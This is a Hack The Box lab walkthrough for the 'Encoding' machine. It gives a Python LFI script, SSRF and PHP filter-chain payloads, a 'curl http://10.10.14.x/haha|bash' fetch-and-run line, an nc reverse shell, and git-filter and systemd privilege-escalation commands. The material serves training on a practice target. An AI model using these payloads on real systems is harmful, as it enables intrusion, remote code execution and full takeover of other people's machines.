# HTB-Encoding

Today we are going to solve the recent machine HTB-ENCODING . This machine is little bit tricky . <br><br>
![Encoding](https://user-images.githubusercontent.com/114393219/219792435-ff16be6e-4f8e-4051-9e74-2965a4afc38f.png)
<br><br>

Let's just start with our regular NMAP Scan ``nmap -T4 -A -vv 10.10.11.198``. As usual we found 2 ports open port ``22`` and port ``80``. <br>

# Nmap Scan

````
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: HaxTables
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
....

````

<br>

Let's visit the site And I found Intresting subdomain  ``api.haxtables.htb``. I added ``$IP haxtables.htb api.haxtables.htb`` to my  ``/etc/hosts``  file . <br>

![image](https://user-images.githubusercontent.com/114393219/219797178-35bddb01-994a-400b-97d0-cc8cfa15142e.png)

<br>

# Subdomain Enumeration 

````
ffuf -H "Host:FUZZ.haxtables.htb" -w /usr/share/payloads/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://haxtables.htb  -fw "246"
````
In the Output I got new subdomain ``image.haxtables.htb`` & updated my  ``/etc/hosts`` file

![image](https://user-images.githubusercontent.com/114393219/219800693-aa872ecc-c559-4a9e-8b77-3dcfe55edb18.png)

<br><br>
However, when trying to access that subdomain, we get a redirect to an ``HTTP 403 (Forbidden)`` status.

![image](https://user-images.githubusercontent.com/114393219/219801079-2792bc4d-ec10-43ff-9621-abb8468e3cbc.png)

# Foothold

Now at this step the machine get's interesting  😁 .
<br>
The instresting thing that got my attention is .....this part =>
![image](https://user-images.githubusercontent.com/114393219/219802748-6b515f3f-2bda-4090-82f4-ca3739dd595f.png)
<br>
I think LFI is possible(maybe) here if we caan intercept the request and change the ``file_url`` parameter .

When accessing the conversion page, we notice the presence of a panel in which we can enter data, which will be converted to its corresponding specific conversion format. and from the above image we can see that the request is being sent if we use ``sting2hex`` .

![image](https://user-images.githubusercontent.com/114393219/219803811-dccad7f4-a7c8-4fc0-a92c-3d3398fe8025.png)

<br>
Now open Burp Suite and intercept this request . If we intercept the request,, we can see that it is directed to the handler route, in which three parameters are sent:  ``action`` , ``data`` and ``uri_path`` . These parameters turn out to be crucial as we will use them later to create a reverse shell.

![image](https://user-images.githubusercontent.com/114393219/219804366-c2e64801-52be-4631-a4e7-82be2eeb53d1.png)

This platform has an API menu that presents us with various ways to use its API. One of them involves sending POST requests that include data in JSON format. One of the parameters in such requests is file_url, which allows us to exploit the file protocol and access system files.

The ``file`` protocol is a network protocol used to access files hosted on a local or remote system. This protocol integrates with the file system and allows programs to access files over the network as if they were on the local system.
However, this integration can result in a vulnerability if it is not implemented securely. For example, if an application allows users to specify a URL that includes the "file" protocol, an attacker can attempt to access sensitive files on the remote system.

In our intresting part that I found earlier we can convert it into python script but it is not optimised and we get output in hexadececimal format . <br>
So for Optimized output, use this python script as it convert the output hexadecimal to strings .

````
import requests
import json

def lfi(fil):
    json_data = {
        'action': 'str2hex',
        'file_url' : f"file://{fil}"

    }
    print(json_data)

    response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php',json=json_data)
    data = json.loads(response.text)
    hex_string = data["data"]
    bytes_object = bytes.fromhex(hex_string)
    string = bytes_object.decode()
    print(string)
    #print(response.text)


def main():
    while True:
        lf = input("[+]FILE >")
        lfi(lf)

main()
````
Use the above script and now our LFI is successfull . 

![image](https://user-images.githubusercontent.com/114393219/219811187-4e61ea25-7cfd-4da4-b38c-d5fec5363821.png)

Now I tried to read the index.php for the second subdomain that we found while subdomain enumeration ``image.haxtable.htb`` .
![image](https://user-images.githubusercontent.com/114393219/219811947-640962b9-3769-4181-8856-641151158258.png)

Then I took a look at ``utils.php`` and there are several functions that make use of the Git binary.

![image](https://user-images.githubusercontent.com/114393219/219812329-0cf9268a-e669-42b6-8054-255911662b01.png)

After analyzing the code of utils.php, I discover that it makes use of the git tool. This leads us to the conclusion that it is possible that a .git directory exists in the ``/var/www/image/`` directory With this finding, we try to access to key files within that directory via the LFI. It turned out that if the ``.git`` directory was present, the next step would be to download that directory to continue the analysis. <br>
We will use ``gitdumper.sh`` script to dump the git directory and we can analyze it locally . <br>
Here is the link for this script https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh <br>

Now in the script, Add the following parameters to the curl query: ``application/json`` will be the content-type in the header, and a binary file containing the str2hex action values and the file's address URL will be delivered together with the data supplied in the ``--data-binary`` argument: The Haxtables API is available at http://api.haxtables.htb/v3/tools/string/index.php as /var/www/image/.git/$objname. ``jq`` will be used to parse the response and extract only the pertinent information, and xxd will be used to transform the hexadecimal output into a binary file that will be saved to ``$target``. <br>
OR <br>
Just replace the curl line with this below line :) .
````
curl -X POST -H 'Content-Type: application/json' --data-binary "{\"action\": \"str2hex\", \"file_url\": \"file:///var/www/image/.git/$objname\"}" 'http://api.haxtables.htb/v3/tools/string/index.php' | jq .data | xxd -r -p > "$target"
````

Now dump the git directory using the following command
````./gitdumper.sh  http://image.haxtables.htb/.git/ image````

We will use GitKraken, a Git repository visualization tool, to more clearly and visually analyze the repository.
<br><br>
Here is the link for GitKraken https://www.gitkraken.com/  OR you can download directly using snapstore.
<br><br>
After analyzing the repository with GitKraken, we note that there is an interesting file called ``action_handler.php``
<br><br>
![image](https://user-images.githubusercontent.com/114393219/219817773-81e99ff0-9a1f-43a6-abff-a0a4473bdd85.png)

## Analyzing Action_Handler.php

An example of PHP code that contains a file supplied in a Request parameter named "page" is shown below. The script initially includes the "utils.php" file before checking to see if the "page" GET parameter is present. If it does, the parameter value is assigned to a "page" variable, which includes the file indicated there. A "No page specified!" message is printed if the "page" option is missing.

Because it allows you to provide a file to include via an HTTP parameter, this code is susceptible to LFI.
````
<?php 
 
include_once 'utils.php'; 
 
if (isset($_GET['page'])) { 
    $page = $_GET['page']; 
    include($page); 
 
} else { 
    echo jsonify(['message' => 'No page specified!']); 
} 
 
?>
````
<br><br>
We discover that the code is vulnerable to SSRF after thoroughly analysing it. The code determines whether JSON or file-format data was sent in the HTTP request. The data is decrypted and utilised in a call to the ``make_api_call`` function in both scenarios. Before being utilised in the HTTP request, the data is not properly validated, though.
<br>
On this method, we can conduct the ssrf and consult the file "action handler" of the LFI-vulnerable subdomain ``image.haxtables.htb``.
````
whatever@image.haxtables.htb/actions/action_handler.php?page=/etc/passwd&"}
````
![image](https://user-images.githubusercontent.com/114393219/219818909-96043f2b-09c2-4395-bd82-35b65d847acf.png)

<br>

The JSON request parameters will look like this 
````
{"action":"str2hex","data":"lol","uri_path":"whatever@image.haxtables.htb/actions/action_handler.php?page=/etc/passwd&"}
````

## Php Filter Chain for RCE

I discovered that we may utilize the ``php filters chain`` approach, which enables an attacker to create a chain of filters that process and modify input data. An interactive shell can be created using this method.
<br><br>
The following generator can be used to speed up and automate the process of building a PHP filter chain. With the help of this generator, we can quickly build a series of reliable filters without experiencing any difficulties or problems.
<br><br>
Here is the link for Php-filter Chain :: https://github.com/synacktiv/php_filter_chain_generator
<br><br>
Now first create a file "$file_name" with reverse shell inside on your local machine
````
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.x 9001 >/tmp/f" > haha
````
Then host the python http server at the location where our above rev-shell file is created !!
<br><br>
![Screenshot from 2023-02-18 05-48-06](https://user-images.githubusercontent.com/114393219/219820279-2d1e69ba-1630-4815-aba4-0c487156e8c2.jpg)

````
python3 php_filter_chain_generator.py --chain "<?php system('curl http://10.10.14.x/haha|bash');?>"
````
This will generate php-filter chain . Now copy the output from
```
php://filter/convert.iconv.UTF8.C......................................................................................................|convert.base64-decode/resource=php://temp
```
And put in the JSON parameter of uripath & your POST request would like this :::
````
POST /handler.php HTTP/1.1
Host: haxtables.htb
Content-Length: 10544
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept: */*
Origin: http://haxtables.htb
Referer: http://haxtables.htb/index.php?page=string
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

{"action":"str2hex","data":"lol","uri_path":"whatever@image.haxtables.htb/actions/action_handler.php?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921................................................................................|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"}
````
<br>
Our request has been successfully executed and now our rev-shell payload ``haha`` is on the server 

![image](https://user-images.githubusercontent.com/114393219/219821774-b260bce8-9694-4616-a5d1-7f787cab6269.png)

## Reverse Shell

Start a Listner on your local machine using the command ``nc -lvnp 9001``
<br>
Now send request to ``http://haxtables.htb/haha`` . It will show that URL not found but don't worry , our file has been executed and we got a Reverse Shell .
![image](https://user-images.githubusercontent.com/114393219/219822042-f2b67617-948c-495b-b6c6-257cf7dac091.png)

![image](https://user-images.githubusercontent.com/114393219/219822168-1983cf33-b601-4332-afae-fecb3dbc3bd1.png)

## Lateral movement (www-data to svc)

It's important to look into our user's permissions once we have used a reverse shell to get access to the system. We can see that we have permissions to run the "git-commit.sh" script in the "/var/www/image/scripts" path by using the ``sudo -l`` command.

![image](https://user-images.githubusercontent.com/114393219/219822743-bcc2a691-3de7-4207-bc25-1db1925ceb07.png)


The 'git-commit.sh' script is used to manage files in a Git repository, as can be seen by looking at its source code. The next commit will include any files that have not yet been added to Git's tracker using the 'git add -A' command. A "commit" will be carried out with the predetermined message "Committed from API!" and the author provided in the "git commit command" if there are no unfollowed files. <br>

Create a reverse shell payload in ``/tmp`` directory and execute the following commands in ``/var/www/image/`` directory .
````
git init
echo '*.php filter=indent' > .git/info/attributes
git config filter.indent.clean /tmp/revshell
sudo -u svc /var/www/image/scripts/git-commit.sh
````

Dont forget to Open a listener on local machine && make our payload in tmp directory executable. <br><br>


And Finally we are now SVC 

![Screenshot from 2023-02-18 07-39-06](https://user-images.githubusercontent.com/114393219/219826277-b0265e11-9b54-46c9-89fe-81aa66330de4.png)

## SVC to Root 

In the SVC home directory you can find user flag . And there is .ssh directory , from there you can copy id_rsa & you can ssh as svc :)

<br><br>

I tried to run ``sudo -l`` and found that we can restart any service as a root .
<br>
![Screenshot from 2023-02-18 07-45-17](https://user-images.githubusercontent.com/114393219/219826663-04be6c14-71f8-4665-a5ca-06cb5a1465ef.png)

So We are going to create a service and specify the details in a configuration file in the path `/etc/systemd/system/` since we have write permissions to it, this file will specify that the service type is `oneshot` and that the command to run will be `chmod +s /bin/bash` when the service starts. In addition, it will be established that the service will be required by the `multi-user.target` target.

![image](https://user-images.githubusercontent.com/114393219/219827002-f78241f5-1b46-406c-bc7b-9caf07dea154.png)

Now you are just one step away  😁 !!

Just use ``/bin/bash -p`` & BOOM !!!!! You are root now !
![image](https://user-images.githubusercontent.com/114393219/219827083-deefeaf2-a603-4480-b054-184ddcb0e32a.png)

Thankyou :)<br><br>
If you are having any problem , you can ask me on discord 
